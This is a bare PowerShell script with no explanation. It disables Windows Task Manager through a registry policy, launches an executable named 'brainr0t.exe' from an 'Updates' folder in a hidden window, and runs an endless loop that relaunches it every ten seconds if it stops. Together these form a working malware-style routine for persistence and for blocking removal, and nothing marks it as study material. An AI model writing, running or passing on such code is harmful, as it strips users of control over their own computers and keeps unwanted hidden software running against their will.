Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Force
Start-Process -FilePath "C:\Updates\brainr0t.exe" -WindowStyle Hidden
while ($true) {
    if (-not (Get-Process -Name "brainr0t" -ErrorAction SilentlyContinue)) {
        Start-Process -FilePath "C:\Updates\brainr0t.exe" -WindowStyle Hidden
    }
    Start-Sleep -Seconds 10
}
